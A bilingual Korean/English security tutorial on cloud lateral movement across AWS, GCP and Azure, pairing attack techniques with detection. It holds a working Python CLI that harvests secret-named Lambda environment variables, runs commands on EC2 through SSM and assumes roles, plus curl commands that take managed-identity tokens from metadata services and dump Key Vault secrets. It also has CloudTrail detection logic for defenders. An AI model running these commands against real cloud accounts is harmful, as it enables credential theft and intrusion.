> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 클라우드 횡이동 — 계정 피버팅·서비스 간 이동·탐지

## 0. 초보자를 위한 개념 이해

### 클라우드 횡이동이란?

클라우드 횡이동(Cloud Lateral Movement)은 초기 침투 후 공격자가 하나의 클라우드 서비스에서 다른 서비스로 권한을 확장하며 이동하는 기법입니다. 온프레미스에서 서버에서 서버로 이동하듯, 클라우드에서는 EC2 → Lambda → S3 → RDS 등 서비스 간 IAM 권한 체인을 따라 이동합니다. STS AssumeRole을 활용한 계정 간 이동까지 포함하면, 하나의 작은 취약점이 전체 AWS 조직 침해로 이어질 수 있습니다.

**왜 배우는가:**
```
클라우드 횡이동 경로 예시:

  Lambda 함수 RCE (초기 접근)
       ↓
  Lambda 실행 역할의 IAM 권한 확인
       ↓
  S3 버킷 접근 → 자격증명 파일 발견
       ↓
  STS AssumeRole → 다른 계정/역할로 전환
       ↓
  RDS 데이터베이스 접근 → 전체 데이터 탈취

  방어 관점: 각 서비스의 최소 권한이 핵심
```

### 핵심 개념 정리

```
클라우드 횡이동 핵심 개념:

  IMDS (Instance Metadata Service)
    EC2 내부에서 http://169.254.169.254/ 접근
    → 임시 IAM 자격증명 획득

  STS AssumeRole
    현재 자격증명으로 다른 IAM 역할 임시 획득
    → 더 높은 권한 역할로 전환

  리소스 기반 정책
    S3 버킷·Lambda 등에 직접 붙은 정책
    → 교차 계정 역할 없이도 다른 계정 접근 가능

  횡이동 경로 탐색:
    현재 역할 권한 확인 → PassRole/AssumeRole 탐색
    → 접근 가능한 서비스 열거 → 자격증명/데이터 탐색
```

### 필요한 도구 및 환경
- **boto3**: Python AWS SDK (서비스 간 접근 자동화)
- **aws_consoler**: 자격증명 → 콘솔 접근 URL 생성
- **CloudMapper**: AWS 네트워크 시각화 및 권한 분석
- **PMapper (Principal Mapper)**: IAM 권한 상승 경로 시각화

### 기초 실습 예제
```python
#!/usr/bin/env python3
"""AWS IAM 역할 AssumeRole 체인 탐색 — 횡이동 경로 파악."""

import boto3
from botocore.exceptions import ClientError


def get_assumable_roles(
    iam_client: "boto3.client",
    current_arn: str,
) -> list[dict]:
    """현재 자격증명으로 AssumeRole 가능한 역할 목록을 탐색합니다."""
    assumable: list[dict] = []
    try:
        roles = iam_client.list_roles()["Roles"]
    except ClientError:
        return assumable

    for role in roles:
        trust_policy = role.get("AssumeRolePolicyDocument", {})
        statements = trust_policy.get("Statement", [])
        for stmt in statements:
            principal = stmt.get("Principal", {})
            aws_principal = principal.get("AWS", "")
            # 현재 ARN 또는 전체 계정이 principal인 경우
            if current_arn in str(aws_principal) or ":root" in str(aws_principal):
                if stmt.get("Effect") == "Allow":
                    assumable.append({
                        "role_arn": role["Arn"],
                        "role_name": role["RoleName"],
                    })
    return assumable


if __name__ == "__main__":
    session = boto3.Session()
    sts = session.client("sts")
    iam = session.client("iam")
    try:
        identity = sts.get_caller_identity()
        print(f"현재 ARN: {identity['Arn']}")
        roles = get_assumable_roles(iam, identity["Arn"])
        print(f"\nAssumeRole 가능한 역할 ({len(roles)}개):")
        for r in roles:
            print(f"  {r['role_arn']}")
    except ClientError as e:
        print(f"오류: {e}")
```

---

## 1. 클라우드 횡이동 경로

```
초기 접근 (Lambda/EC2 RCE)
    │
    ▼
인스턴스 메타데이터 서비스 (IMDS)
    │  → IAM 역할 임시 자격증명 획득
    ▼
IAM 역할 분석
    │  → 다른 서비스 접근 권한 확인
    ▼
클라우드 서비스 횡이동
    │  → S3 → Lambda → RDS → ECS
    │  → STS AssumeRole 체인
    ▼
다른 계정/리전으로 이동
    │  → 리소스 기반 정책 활용
    │  → 교차 계정 역할
```

---

## 2. AWS 서비스 간 횡이동

```python
#!/usr/bin/env python3
"""AWS 서비스 간 횡이동 경로 탐색 CLI."""

import argparse
import json
import boto3
from botocore.exceptions import ClientError, NoCredentialsError


def get_current_identity() -> dict:
    sts = boto3.client("sts")
    try:
        return sts.get_caller_identity()
    except (ClientError, NoCredentialsError) as e:
        return {"error": str(e)}


def enumerate_accessible_s3_buckets() -> list[dict]:
    """접근 가능한 S3 버킷 열거."""
    s3 = boto3.client("s3")
    accessible = []
    try:
        buckets = s3.list_buckets()["Buckets"]
        for bucket in buckets:
            name = bucket["Name"]
            try:
                # 버킷 내용 접근 시도
                s3.head_bucket(Bucket=name)
                accessible.append({
                    "name": name,
                    "created": str(bucket.get("CreationDate")),
                    "readable": True,
                })
            except ClientError as e:
                if e.response["Error"]["Code"] == "403":
                    accessible.append({"name": name, "readable": False})
    except ClientError:
        pass
    return accessible


def pivot_via_ssm(
    instance_id: str,
    command: str,
    region: str = "ap-northeast-2",
) -> dict:
    """SSM Session Manager로 EC2 명령 실행 (IAM 권한 있을 때)."""
    ssm = boto3.client("ssm", region_name=region)
    try:
        response = ssm.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={"commands": [command]},
        )
        command_id = response["Command"]["CommandId"]
        import time
        time.sleep(2)

        output = ssm.get_command_invocation(
            CommandId=command_id,
            InstanceId=instance_id,
        )
        return {
            "stdout": output.get("StandardOutputContent"),
            "stderr": output.get("StandardErrorContent"),
            "status": output.get("Status"),
        }
    except ClientError as e:
        return {"error": str(e)}


def enumerate_lambda_functions(region: str = "ap-northeast-2") -> list[dict]:
    """Lambda 함수 열거 및 환경 변수 접근 시도."""
    lambda_client = boto3.client("lambda", region_name=region)
    functions = []

    try:
        paginator = lambda_client.get_paginator("list_functions")
        for page in paginator.paginate():
            for func in page["Functions"]:
                func_info = {
                    "name": func["FunctionName"],
                    "runtime": func.get("Runtime"),
                    "role": func.get("Role"),
                    "env_vars": {},
                }
                # 환경 변수 접근 시도
                try:
                    config = lambda_client.get_function_configuration(
                        FunctionName=func["FunctionName"]
                    )
                    env = config.get("Environment", {}).get("Variables", {})
                    # 민감 환경 변수 필터링
                    func_info["env_vars"] = {
                        k: v for k, v in env.items()
                        if any(kw in k.upper() for kw in ["KEY", "SECRET", "TOKEN", "PASS", "DB"])
                    }
                except ClientError:
                    pass
                functions.append(func_info)
    except ClientError as e:
        print(f"Lambda 열거 오류: {e}")

    return functions


def find_ec2_instances_with_public_ip(region: str = "ap-northeast-2") -> list[dict]:
    """퍼블릭 IP를 가진 EC2 인스턴스 탐색."""
    ec2 = boto3.client("ec2", region_name=region)
    public_instances = []

    try:
        paginator = ec2.get_paginator("describe_instances")
        for page in paginator.paginate():
            for reservation in page["Reservations"]:
                for instance in reservation["Instances"]:
                    public_ip = instance.get("PublicIpAddress")
                    if public_ip:
                        public_instances.append({
                            "instance_id": instance["InstanceId"],
                            "public_ip": public_ip,
                            "private_ip": instance.get("PrivateIpAddress"),
                            "state": instance["State"]["Name"],
                            "tags": {t["Key"]: t["Value"] for t in instance.get("Tags", [])},
                        })
    except ClientError as e:
        print(f"EC2 열거 오류: {e}")

    return public_instances


def assume_role_and_enumerate(
    role_arn: str,
    session_name: str = "PivotSession",
) -> dict:
    """역할 전환 후 자원 열거."""
    sts = boto3.client("sts")
    try:
        assumed = sts.assume_role(
            RoleArn=role_arn,
            RoleSessionName=session_name,
        )
        creds = assumed["Credentials"]

        # 임시 자격증명으로 새 세션 생성
        session = boto3.Session(
            aws_access_key_id=creds["AccessKeyId"],
            aws_secret_access_key=creds["SecretAccessKey"],
            aws_session_token=creds["SessionToken"],
        )

        sts_new = session.client("sts")
        identity = sts_new.get_caller_identity()
        return {
            "role_arn": role_arn,
            "assumed_identity": identity,
            "expiration": str(creds["Expiration"]),
        }
    except ClientError as e:
        return {"error": str(e)}


def main() -> None:
    parser = argparse.ArgumentParser(description="AWS 클라우드 횡이동 탐색")
    sub = parser.add_subparsers(dest="cmd", required=True)

    who_p = sub.add_parser("whoami", help="현재 AWS 자격증명 확인")
    s3_p = sub.add_parser("s3", help="S3 버킷 열거")
    lambda_p = sub.add_parser("lambda", help="Lambda 함수 열거")
    lambda_p.add_argument("--region", default="ap-northeast-2")
    ec2_p = sub.add_parser("ec2", help="EC2 인스턴스 열거")
    ec2_p.add_argument("--region", default="ap-northeast-2")
    assume_p = sub.add_parser("assume", help="역할 전환")
    assume_p.add_argument("role_arn")

    args = parser.parse_args()

    match args.cmd:
        case "whoami":
            identity = get_current_identity()
            print(json.dumps(identity, indent=2, default=str))
        case "s3":
            buckets = enumerate_accessible_s3_buckets()
            for b in buckets:
                icon = "[+]" if b.get("readable") else "[-]"
                print(f"{icon} {b['name']}")
        case "lambda":
            functions = enumerate_lambda_functions(args.region)
            for f in functions:
                print(f"\n[*] {f['name']} ({f['runtime']})")
                if f["env_vars"]:
                    print(f"  [!] 민감 환경 변수: {list(f['env_vars'].keys())}")
        case "ec2":
            instances = find_ec2_instances_with_public_ip(args.region)
            for inst in instances:
                print(f"[+] {inst['instance_id']}: {inst['public_ip']} ({inst['state']})")
        case "assume":
            result = assume_role_and_enumerate(args.role_arn)
            print(json.dumps(result, indent=2, default=str))


if __name__ == "__main__":
    main()
```

---

## 3. GCP 횡이동

```bash
# GCP 서비스 계정 열거
gcloud iam service-accounts list --format="table(email,displayName)"

# 서비스 계정 키 생성 (권한 있을 때)
gcloud iam service-accounts keys create key.json \
  --iam-account=sa@project.iam.gserviceaccount.com

# GCP 프로젝트 간 이동
gcloud config set project another-project
gcloud compute instances list

# Metadata 서비스
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
```

---

## 4. Azure 횡이동

```bash
# 현재 자격증명 확인
az account show
az account get-access-token

# 구독 열거
az account list --output table

# 관리 자격증명 탈취 (IMDS)
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# 역할 할당 확인
az role assignment list --all --output table

# Key Vault 시크릿 접근
az keyvault list
az keyvault secret list --vault-name VAULT_NAME
az keyvault secret show --name SECRET --vault-name VAULT_NAME
```

---

## 5. 클라우드 횡이동 탐지

| 공격 | 탐지 이벤트 | 방어 |
|------|-------------|------|
| IMDS 접근 | VPC Flow Logs + 메타데이터 접근 로그 | IMDSv2 강제 |
| AssumeRole | CloudTrail AssumeRole 이벤트 | SCP로 특정 역할 제한 |
| 비정상 리전 | CloudTrail ConsoleLogin 리전 확인 | SCP로 허용 리전 제한 |
| 신규 IAM 키 | CloudTrail CreateAccessKey | GuardDuty 알림 |
| 퍼블릭 버킷 생성 | S3 버킷 ACL 변경 | S3 Block Public Access |

## 5.5 크로스 계정 Role Chaining 탐지

공격자는 탈취한 자격증명으로 `sts:AssumeRole`을 반복 호출해 A 계정 → B 계정 → C 계정으로 역할을 갈아타며(Role Chaining) 흔적을 흐린다. 각 홉은 CloudTrail에 별도 이벤트로 남지만, 계정이 분리된 조직에서는 이를 하나의 체인으로 재구성하는 로직이 없으면 놓치기 쉽다.

```python
#!/usr/bin/env python3
"""CloudTrail 이벤트에서 AssumeRole 체인(크로스 계정 Role Chaining) 재구성."""
import json
from collections import defaultdict
from pathlib import Path


def load_events(path: Path) -> list[dict]:
    return [json.loads(line) for line in path.read_text().splitlines() if line.strip()]


def build_chains(events: list[dict]) -> dict[str, list[dict]]:
    """세션 이름(roleSessionName)을 키로 AssumeRole 호출 순서를 묶는다."""
    chains = defaultdict(list)
    for e in events:
        if e.get("eventName") != "AssumeRole":
            continue
        params = e.get("requestParameters", {}) or {}
        session = params.get("roleSessionName", "unknown")
        chains[session].append({
            "time": e.get("eventTime"),
            "source_account": e.get("recipientAccountId"),
            "target_role": params.get("roleArn"),
            "source_identity": e.get("userIdentity", {}).get("arn"),
        })
    return chains


def flag_suspicious(chains: dict[str, list[dict]], min_hops: int = 2) -> None:
    for session, hops in chains.items():
        if len(hops) < min_hops:
            continue
        accounts = {h["source_account"] for h in hops} | {
            h["target_role"].split(":")[4] for h in hops if h["target_role"]
        }
        print(f"[!] 세션 '{session}': {len(hops)}홉, 계정 {len(accounts)}개 경유")
        for h in sorted(hops, key=lambda x: x["time"]):
            print(f"    {h['time']}  {h['source_identity']} -> {h['target_role']}")


if __name__ == "__main__":
    events = load_events(Path("cloudtrail_events.jsonl"))
    chains = build_chains(events)
    flag_suspicious(chains)
```

**탐지 포인트**: 동일한 `roleSessionName`(또는 `sourceIdentity`, 2023년 이후 리전에 전파됨)이 여러 계정 경계를 넘나들며 짧은 시간 안에 반복되면 정상 자동화보다 수동 탐색·횡이동일 가능성이 높다. AWS Organizations 환경에서는 조직 트레일(Org Trail)로 모든 계정의 CloudTrail을 중앙 집계해야 이 재구성이 가능하다 — 계정별 트레일만 있으면 체인의 중간 홉이 다른 계정 로그에 묻혀 보이지 않는다.

---

<!-- detect-validate-14 -->
## 클라우드 횡이동 탐지와 방어 검증

클라우드 횡이동은 *어떻게 계정·서비스 간 피버팅하는가*를 다루지만, 방어자는 **역할 가정·교차계정 접근이 감사로그에 어떻게 남는가**와 **신뢰 경계·세션 정책이 실제로 막는가**를 검증해야 한다.

### 공격 → 계층 → 통제(방어자) → 탐지 신호

| 기법 | 노리는 계층 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| 역할 가정(AssumeRole) | 신뢰 정책 | 최소 신뢰, 조건 | 비정상 AssumeRole, role chaining |
| 교차 계정 피버팅 | 계정 경계 | 외부ID, SCP | 신규 교차계정 접근 |
| 서비스 간 이동 | 서비스 권한 | 최소권한, 경계 | 비정상 서비스→서비스 호출 |
| 인스턴스→클라우드 | 메타데이터/역할 | IMDSv2, 권한 분리 | 인스턴스 역할의 광범위 API 사용 |

### 방어 검증 (직접 확인)

```bash
# 역할 가정(AssumeRole) 횡이동이 CloudTrail 에 탐지되는지 검증(소유 계정)
aws cloudtrail lookup-events --max-results 15 \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole \
  --query 'Events[].{t:EventTime,u:Username}' --output table
# 비정상 교차계정 AssumeRole / 짧은 시간 다중 role chaining 패턴을 점검
```

> 검증은 반드시 **소유한 계정·통제 환경**에서만(RoE 준수). "신뢰 정책/SCP 설정"과 "횡이동을 실제 막고 탐지한다"는 다르다 — 통제 환경에서 AssumeRole 체인 PoC 를 재현해 경보·차단을 확인한다([[58_Cloud_IR]], [[13_SOC_Blue_Team]]).

---

<a name="english"></a>

# Cloud Lateral Movement — Account Pivoting, Cross-Service Movement, and Detection

## 1. Cloud Lateral Movement Paths

```
Initial Access (Lambda/EC2 RCE)
    │
    ▼
Instance Metadata Service (IMDS)
    │  → Obtain IAM role temporary credentials
    ▼
IAM Role Analysis
    │  → Identify access to other services
    ▼
Cloud Service Lateral Movement
    │  → S3 → Lambda → RDS → ECS
    │  → STS AssumeRole chaining
    ▼
Move to Other Accounts/Regions
    │  → Leverage resource-based policies
    │  → Cross-account roles
```

---

## 2. Lateral Movement Between AWS Services

```python
#!/usr/bin/env python3
"""CLI for exploring lateral movement paths between AWS services."""

import argparse
import json
import boto3
from botocore.exceptions import ClientError, NoCredentialsError


def get_current_identity() -> dict:
    sts = boto3.client("sts")
    try:
        return sts.get_caller_identity()
    except (ClientError, NoCredentialsError) as e:
        return {"error": str(e)}


def enumerate_accessible_s3_buckets() -> list[dict]:
    """Enumerate accessible S3 buckets."""
    s3 = boto3.client("s3")
    accessible = []
    try:
        buckets = s3.list_buckets()["Buckets"]
        for bucket in buckets:
            name = bucket["Name"]
            try:
                # Attempt to access bucket contents
                s3.head_bucket(Bucket=name)
                accessible.append({
                    "name": name,
                    "created": str(bucket.get("CreationDate")),
                    "readable": True,
                })
            except ClientError as e:
                if e.response["Error"]["Code"] == "403":
                    accessible.append({"name": name, "readable": False})
    except ClientError:
        pass
    return accessible


def pivot_via_ssm(
    instance_id: str,
    command: str,
    region: str = "ap-northeast-2",
) -> dict:
    """Execute command on EC2 via SSM Session Manager (when IAM permission exists)."""
    ssm = boto3.client("ssm", region_name=region)
    try:
        response = ssm.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={"commands": [command]},
        )
        command_id = response["Command"]["CommandId"]
        import time
        time.sleep(2)

        output = ssm.get_command_invocation(
            CommandId=command_id,
            InstanceId=instance_id,
        )
        return {
            "stdout": output.get("StandardOutputContent"),
            "stderr": output.get("StandardErrorContent"),
            "status": output.get("Status"),
        }
    except ClientError as e:
        return {"error": str(e)}


def enumerate_lambda_functions(region: str = "ap-northeast-2") -> list[dict]:
    """Enumerate Lambda functions and attempt to access environment variables."""
    lambda_client = boto3.client("lambda", region_name=region)
    functions = []

    try:
        paginator = lambda_client.get_paginator("list_functions")
        for page in paginator.paginate():
            for func in page["Functions"]:
                func_info = {
                    "name": func["FunctionName"],
                    "runtime": func.get("Runtime"),
                    "role": func.get("Role"),
                    "env_vars": {},
                }
                # Attempt to access environment variables
                try:
                    config = lambda_client.get_function_configuration(
                        FunctionName=func["FunctionName"]
                    )
                    env = config.get("Environment", {}).get("Variables", {})
                    # Filter sensitive environment variables
                    func_info["env_vars"] = {
                        k: v for k, v in env.items()
                        if any(kw in k.upper() for kw in ["KEY", "SECRET", "TOKEN", "PASS", "DB"])
                    }
                except ClientError:
                    pass
                functions.append(func_info)
    except ClientError as e:
        print(f"Lambda enumeration error: {e}")

    return functions


def find_ec2_instances_with_public_ip(region: str = "ap-northeast-2") -> list[dict]:
    """Find EC2 instances with public IP addresses."""
    ec2 = boto3.client("ec2", region_name=region)
    public_instances = []

    try:
        paginator = ec2.get_paginator("describe_instances")
        for page in paginator.paginate():
            for reservation in page["Reservations"]:
                for instance in reservation["Instances"]:
                    public_ip = instance.get("PublicIpAddress")
                    if public_ip:
                        public_instances.append({
                            "instance_id": instance["InstanceId"],
                            "public_ip": public_ip,
                            "private_ip": instance.get("PrivateIpAddress"),
                            "state": instance["State"]["Name"],
                            "tags": {t["Key"]: t["Value"] for t in instance.get("Tags", [])},
                        })
    except ClientError as e:
        print(f"EC2 enumeration error: {e}")

    return public_instances


def assume_role_and_enumerate(
    role_arn: str,
    session_name: str = "PivotSession",
) -> dict:
    """Enumerate resources after assuming a role."""
    sts = boto3.client("sts")
    try:
        assumed = sts.assume_role(
            RoleArn=role_arn,
            RoleSessionName=session_name,
        )
        creds = assumed["Credentials"]

        # Create new session with temporary credentials
        session = boto3.Session(
            aws_access_key_id=creds["AccessKeyId"],
            aws_secret_access_key=creds["SecretAccessKey"],
            aws_session_token=creds["SessionToken"],
        )

        sts_new = session.client("sts")
        identity = sts_new.get_caller_identity()
        return {
            "role_arn": role_arn,
            "assumed_identity": identity,
            "expiration": str(creds["Expiration"]),
        }
    except ClientError as e:
        return {"error": str(e)}


def main() -> None:
    parser = argparse.ArgumentParser(description="AWS Cloud Lateral Movement Explorer")
    sub = parser.add_subparsers(dest="cmd", required=True)

    who_p = sub.add_parser("whoami", help="Check current AWS credentials")
    s3_p = sub.add_parser("s3", help="Enumerate S3 buckets")
    lambda_p = sub.add_parser("lambda", help="Enumerate Lambda functions")
    lambda_p.add_argument("--region", default="ap-northeast-2")
    ec2_p = sub.add_parser("ec2", help="Enumerate EC2 instances")
    ec2_p.add_argument("--region", default="ap-northeast-2")
    assume_p = sub.add_parser("assume", help="Assume role")
    assume_p.add_argument("role_arn")

    args = parser.parse_args()

    match args.cmd:
        case "whoami":
            identity = get_current_identity()
            print(json.dumps(identity, indent=2, default=str))
        case "s3":
            buckets = enumerate_accessible_s3_buckets()
            for b in buckets:
                icon = "[+]" if b.get("readable") else "[-]"
                print(f"{icon} {b['name']}")
        case "lambda":
            functions = enumerate_lambda_functions(args.region)
            for f in functions:
                print(f"\n[*] {f['name']} ({f['runtime']})")
                if f["env_vars"]:
                    print(f"  [!] Sensitive env vars: {list(f['env_vars'].keys())}")
        case "ec2":
            instances = find_ec2_instances_with_public_ip(args.region)
            for inst in instances:
                print(f"[+] {inst['instance_id']}: {inst['public_ip']} ({inst['state']})")
        case "assume":
            result = assume_role_and_enumerate(args.role_arn)
            print(json.dumps(result, indent=2, default=str))


if __name__ == "__main__":
    main()
```

---

## 3. GCP Lateral Movement

```bash
# Enumerate GCP service accounts
gcloud iam service-accounts list --format="table(email,displayName)"

# Create service account key (when permission exists)
gcloud iam service-accounts keys create key.json \
  --iam-account=sa@project.iam.gserviceaccount.com

# Move between GCP projects
gcloud config set project another-project
gcloud compute instances list

# Metadata service
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
```

---

## 4. Azure Lateral Movement

```bash
# Check current credentials
az account show
az account get-access-token

# Enumerate subscriptions
az account list --output table

# Steal managed credentials via IMDS
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Check role assignments
az role assignment list --all --output table

# Access Key Vault secrets
az keyvault list
az keyvault secret list --vault-name VAULT_NAME
az keyvault secret show --name SECRET --vault-name VAULT_NAME
```

---

## 5. Cloud Lateral Movement Detection

| Attack | Detection Event | Defense |
|--------|----------------|---------|
| IMDS access | VPC Flow Logs + metadata access logs | Enforce IMDSv2 |
| AssumeRole | CloudTrail AssumeRole event | Restrict specific roles via SCP |
| Anomalous region | CloudTrail ConsoleLogin region check | Restrict allowed regions via SCP |
| New IAM key | CloudTrail CreateAccessKey | GuardDuty alert |
| Public bucket creation | S3 bucket ACL change | S3 Block Public Access |

---

## 5.5 Cross-Account Role Chaining Detection

Attackers repeatedly call `sts:AssumeRole` with stolen credentials to hop from account A to B to C (role chaining), blurring their trail. Each hop lands as a separate CloudTrail event, so in organizations with account separation, the pattern is easy to miss without logic that reconstructs the full chain.

```python
#!/usr/bin/env python3
"""Reconstruct AssumeRole chains (cross-account role chaining) from CloudTrail events."""
import json
from collections import defaultdict
from pathlib import Path


def load_events(path: Path) -> list[dict]:
    return [json.loads(line) for line in path.read_text().splitlines() if line.strip()]


def build_chains(events: list[dict]) -> dict[str, list[dict]]:
    """Group AssumeRole calls by session name (roleSessionName) to trace the hop order."""
    chains = defaultdict(list)
    for e in events:
        if e.get("eventName") != "AssumeRole":
            continue
        params = e.get("requestParameters", {}) or {}
        session = params.get("roleSessionName", "unknown")
        chains[session].append({
            "time": e.get("eventTime"),
            "source_account": e.get("recipientAccountId"),
            "target_role": params.get("roleArn"),
            "source_identity": e.get("userIdentity", {}).get("arn"),
        })
    return chains


def flag_suspicious(chains: dict[str, list[dict]], min_hops: int = 2) -> None:
    for session, hops in chains.items():
        if len(hops) < min_hops:
            continue
        accounts = {h["source_account"] for h in hops} | {
            h["target_role"].split(":")[4] for h in hops if h["target_role"]
        }
        print(f"[!] Session '{session}': {len(hops)} hops across {len(accounts)} accounts")
        for h in sorted(hops, key=lambda x: x["time"]):
            print(f"    {h['time']}  {h['source_identity']} -> {h['target_role']}")


if __name__ == "__main__":
    events = load_events(Path("cloudtrail_events.jsonl"))
    chains = build_chains(events)
    flag_suspicious(chains)
```

**Detection point**: if the same `roleSessionName` (or `sourceIdentity`, propagated since 2023 in most regions) crosses multiple account boundaries within a short window, that pattern looks more like manual reconnaissance or lateral movement than routine automation. In AWS Organizations, this reconstruction only works with a centralized org trail aggregating CloudTrail across every account — per-account trails leave the middle hops buried in a different account's logs.

---

<!-- detect-validate-14 -->
## Cloud Lateral Movement Detection and Defense Validation

Cloud lateral movement describes *how to pivot across accounts/services*, but defenders must verify **how role assumption and cross-account access surface in audit logs** and **whether trust boundaries and session policies actually block**.

### Attack -> Layer -> Control (defender) -> Detection signal

| Technique | Targeted layer | Primary control (defender) | Detection signal |
|---|---|---|---|
| Role assumption (AssumeRole) | Trust policy | Minimal trust, conditions | Abnormal AssumeRole, role chaining |
| Cross-account pivot | Account boundary | External ID, SCP | New cross-account access |
| Service-to-service move | Service permission | Least privilege, boundary | Abnormal service->service calls |
| Instance->cloud | Metadata/role | IMDSv2, privilege separation | Instance role making broad API calls |

### Defense validation (verify directly)

```bash
# Verify AssumeRole lateral movement is detected by CloudTrail (own account)
aws cloudtrail lookup-events --max-results 15 \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole \
  --query 'Events[].{t:EventTime,u:Username}' --output table
# Check for abnormal cross-account AssumeRole / multiple role-chaining in a short window
```

> Validate only on **owned accounts / controlled environments** (follow RoE). "Configured trust policy/SCP" differs from "actually blocks and detects lateral movement" — reproduce an AssumeRole-chain PoC in a controlled environment to confirm alerts/blocking ([[58_Cloud_IR]], [[13_SOC_Blue_Team]]).
